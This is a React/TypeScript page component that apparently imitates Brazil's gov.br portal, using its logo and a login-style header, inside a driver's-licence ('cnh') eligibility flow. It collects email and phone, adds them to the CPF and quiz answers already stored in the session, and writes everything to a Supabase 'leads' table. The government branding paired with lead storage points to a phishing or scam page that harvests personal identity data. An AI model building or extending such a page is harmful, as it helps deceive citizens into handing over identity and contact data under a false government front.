import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { User, Mail, Phone } from 'lucide-react';
import { supabase } from '../integrations/supabase/client';
import { v4 as uuidv4 } from 'uuid';

const ContactInfoHeader: React.FC<{ userName?: string }> = ({ userName }) => (
    <header className="bg-white border-b border-gray-200">
        <div className="max-w-4xl mx-auto px-4">
            <div className="py-3 flex items-center justify-between">
                <div className="flex items-center gap-4">
                    <img 
                        src="/Gov.br_logo.svg.png" 
                        alt="gov.br" 
                        className="h-8 md:h-10"
                    />
                </div>
                <div className="flex items-center gap-2">
                    <button className="flex items-center gap-2 bg-[#004381] text-white px-4 py-1.5 rounded-full text-sm font-medium hover:bg-blue-900 transition-colors">
                        <User size={18} />
                        <span>{userName || 'Entrar'}</span>
                    </button>
                </div>
            </div>
        </div>
    </header>
);

const ContactInfoPage: React.FC = () => {
    const navigate = useNavigate();
    const location = useLocation();
    const [email, setEmail] = useState('');
    const [phone, setPhone] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [firstName, setFirstName] = useState('');

    useEffect(() => {
        const savedData = sessionStorage.getItem('cnh_userData');
        if (savedData) {
            const parsedData = JSON.parse(savedData);
            if (parsedData.name) {
                setFirstName(parsedData.name.split(' ')[0]);
            }
        } else {
            navigate('/login');
        }
    }, [navigate]);

    const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = e.target.value;
        const formattedPhone = value
            .replace(/\D/g, '')
            .replace(/^(\d{2})(\d)/g, '($1) $2')
            .replace(/(\d{5})(\d)/, '$1-$2');
        setPhone(formattedPhone.substring(0, 15));
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setIsLoading(true);

        const { answers } = location.state || {};
        
        const savedDataString = sessionStorage.getItem('cnh_userData');
        if (!savedDataString) {
            alert('Sua sessão expirou. Por favor, comece novamente.');
            navigate('/login');
            setIsLoading(false);
            return;
        }
        
        const savedDataParsed = JSON.parse(savedDataString);
        const unformattedCpf = savedDataParsed.cpf?.replace(/\D/g, '');

        const leadId = uuidv4();

        const { error } = await supabase
            .from('leads')
            .insert([
                { 
                    id: leadId,
                    email: email, 
                    phone: phone,
                    quiz_answers: answers,
                    cpf: unformattedCpf
                }
            ]);

        setIsLoading(false);

        if (error) {
            console.error('Erro ao salvar no Supabase:', error);
            let userMessage = 'Ocorreu um erro ao salvar seu cadastro. Por favor, tente novamente.';
            if (error.code === '23505') {
                userMessage = 'Um cadastro com este e-mail ou CPF já existe. Por favor, use dados diferentes ou tente recuperar seu acesso.';
            }
            alert(userMessage);
        } else {
            const fullData = { 
                ...savedDataParsed, 
                leadId: leadId,
                email: email,
                phone: phone
            };
            sessionStorage.setItem('cnh_userData', JSON.stringify(fullData));
            navigate('/eligibility', { state: { userData: fullData } });
        }
    };

    return (
        <div className="bg-gray-50 min-h-screen">
            <ContactInfoHeader userName={firstName} />
            <main className="max-w-xl mx-auto px-4 py-12">
                <div className="bg-white p-8 rounded-lg shadow-md border border-gray-200">
                    <h1 className="text-2xl font-bold text-gray-800 mb-2">Estamos quase lá!</h1>
                    <p className="text-gray-600 mb-8">Para finalizar, por favor, informe seus dados de contato.</p>
                    
                    <form onSubmit={handleSubmit} className="space-y-6">
                        <div>
                            <label htmlFor="email" className="block text-sm font-bold text-gray-700 mb-1">Email</label>
                            <div className="relative">
                                <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
                                <input 
                                    type="email" 
                                    id="email"
                                    placeholder="seuemail@exemplo.com"
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                    required
                                    className="w-full p-3 pl-10 border border-gray-400 rounded-lg focus:bg-yellow-100 focus:border-yellow-500 focus:ring-1 focus:ring-yellow-500 focus:outline-none text-lg"
                                />
                            </div>
                        </div>
                        <div>
                            <label htmlFor="phone" className="block text-sm font-bold text-gray-700 mb-1">Celular (com DDD)</label>
                             <div className="relative">
                                <Phone className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
                                <input 
                                    type="tel" 
                                    id="phone"
                                    placeholder="(00) 00000-0000"
                                    value={phone}
                                    onChange={handlePhoneChange}
                                    required
                                    className="w-full p-3 pl-10 border border-gray-400 rounded-lg focus:bg-yellow-100 focus:border-yellow-500 focus:ring-1 focus:ring-yellow-500 focus:outline-none text-lg"
                                    maxLength={15}
                                />
                            </div>
                        </div>
                        <button 
                            type="submit"
                            className="w-full bg-[#0d6efd] text-white py-3 rounded-full font-bold text-lg hover:bg-blue-700 transition-colors disabled:bg-gray-400"
                            disabled={isLoading}
                        >
                            {isLoading ? 'Enviando...' : 'Finalizar Cadastro'}
                        </button>
                    </form>
                </div>
            </main>
        </div>
    );
};

export default ContactInfoPage;